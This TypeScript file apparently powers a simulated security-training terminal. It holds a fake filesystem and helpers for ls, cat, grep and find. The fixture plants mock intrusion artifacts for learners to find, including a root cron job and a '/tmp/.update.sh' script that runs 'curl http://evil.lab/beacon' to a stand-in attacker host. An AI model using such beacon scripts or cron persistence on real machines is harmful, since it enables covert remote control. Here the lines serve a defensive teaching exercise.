export type FsEntry = {
  type: "file" | "dir";
  mode?: string;
  content?: string;
  children?: Record<string, FsEntry>;
};

export const NEXUS_LAB_FS: Record<string, FsEntry> = {
  home: {
    type: "dir",
    children: {
      operator: {
        type: "dir",
        children: {
          "readme.txt": {
            type: "file",
            content: "Nexus Lab VM — use ls, cd, cat, grep, find. No real OS execution."
          },
          lab: {
            type: "dir",
            children: {
              ".hidden_flag": { type: "file", content: "NEXUS{priv_esc_simulated}" },
              "notes.txt": { type: "file", content: "Check /tmp for suspicious files." }
            }
          },
          "secret.key": {
            type: "file",
            mode: "000",
            content: "ACCESS DENIED — inspect permissions with ls -la"
          }
        }
      }
    }
  },
  var: {
    type: "dir",
    children: {
      log: {
        type: "dir",
        children: {
          "auth.log": {
            type: "file",
            content:
              "Mar 12 09:14 sshd[4421]: Failed password for root from 10.0.4.88\nMar 12 09:22 sshd[4488]: Accepted password for operator from 10.0.0.5"
          },
          "syslog": {
            type: "file",
            content: "CRON[9912]: (root) CMD (/tmp/.update.sh)"
          }
        }
      }
    }
  },
  etc: {
    type: "dir",
    children: {
      passwd: {
        type: "file",
        content: "root:x:0:0:root:/root:/bin/bash\noperator:x:1000:1000::/home/operator:/bin/bash"
      },
      crontab: {
        type: "file",
        content: "*/5 * * * * root /tmp/.update.sh"
      }
    }
  },
  tmp: {
    type: "dir",
    children: {
      ".miner": { type: "file", content: "xmrig payload (simulated malware artifact)" },
      ".update.sh": { type: "file", content: "#!/bin/bash\ncurl http://evil.lab/beacon" }
    }
  }
};

export function normalizePath(cwd: string, target?: string): string {
  const safe = target?.trim() || ".";
  const base = safe.startsWith("/") ? safe : `${cwd}/${safe}`;
  const parts = base.split("/").filter(Boolean);
  const stack: string[] = [];
  for (const part of parts) {
    if (part === ".") continue;
    if (part === "..") stack.pop();
    else stack.push(part);
  }
  return stack.length === 0 ? "/" : `/${stack.join("/")}`;
}

export function resolvePath(path: string, fs: Record<string, FsEntry>): FsEntry | null {
  const normalized = normalizePath("/", path);
  if (normalized === "/") return { type: "dir", children: fs };

  const parts = normalized.split("/").filter(Boolean);
  let current: Record<string, FsEntry> = fs;
  let node: FsEntry | null = null;

  for (const part of parts) {
    node = current[part] ?? null;
    if (!node) return null;
    if (node.type === "dir") current = node.children ?? {};
  }
  return node;
}

export function listDirectory(path: string, fs: Record<string, FsEntry>): string {
  const node = resolvePath(path, fs);
  if (!node) return `ls: cannot access '${path}': No such file or directory`;
  if (node.type !== "dir" || !node.children) return path;

  return Object.entries(node.children)
    .map(([name, entry]) => {
      const prefix = entry.type === "dir" ? "d" : "-";
      const mode = entry.mode ?? (entry.type === "dir" ? "rwxr-xr-x" : "rw-r--r--");
      return `${prefix}${mode.slice(1)} 1 operator operator 4096 ${name}`;
    })
    .join("\n");
}

export function readFile(path: string, fs: Record<string, FsEntry>): string {
  const node = resolvePath(path, fs);
  if (!node) return `cat: ${path}: No such file or directory`;
  if (node.type === "dir") return `cat: ${path}: Is a directory`;
  if (node.mode === "000") return `cat: ${path}: Permission denied`;
  return node.content ?? "";
}

export function grepInFile(path: string, pattern: string, fs: Record<string, FsEntry>): string {
  const content = readFile(path, fs);
  if (content.startsWith("cat:")) return content;
  const re = new RegExp(pattern, "i");
  const lines = content.split("\n").filter(line => re.test(line));
  return lines.length ? lines.join("\n") : "";
}

export function findFiles(path: string, pattern: string, fs: Record<string, FsEntry>): string[] {
  const results: string[] = [];
  const re = new RegExp(pattern.replace(/\*/g, ".*"), "i");

  function walk(currentPath: string, node: FsEntry) {
    if (node.type === "file" && re.test(currentPath.split("/").pop() ?? "")) {
      results.push(currentPath);
    }
    if (node.type === "dir" && node.children) {
      for (const [name, child] of Object.entries(node.children)) {
        const childPath = currentPath === "/" ? `/${name}` : `${currentPath}/${name}`;
        walk(childPath, child);
      }
    }
  }

  const start = resolvePath(path, fs);
  if (!start) return [];
  if (start.type === "dir" && start.children) {
    for (const [name, child] of Object.entries(start.children)) {
      walk(path === "/" ? `/${name}` : `${path}/${name}`, child);
    }
  }
  return results;
}

export const TERMINAL_COMMANDS = ["ls", "cd", "cat", "grep", "find", "chmod", "ps", "netstat", "pwd", "help", "nmap", "submit"];

export function autocomplete(input: string, cwd: string): string | null {
  const parts = input.split(/\s+/);
  const cmd = parts[0] ?? "";
  if (parts.length === 1) {
    const match = TERMINAL_COMMANDS.find(c => c.startsWith(cmd));
    return match ?? null;
  }
  if (cmd === "cd" || cmd === "cat" || cmd === "grep") {
    const node = resolvePath(cwd, NEXUS_LAB_FS);
    if (!node?.children) return null;
    const partial = parts[parts.length - 1] ?? "";
    const match = Object.keys(node.children).find(name => name.startsWith(partial));
    return match ? `${cmd} ${partial}${match.slice(partial.length)}` : null;
  }
  return null;
}
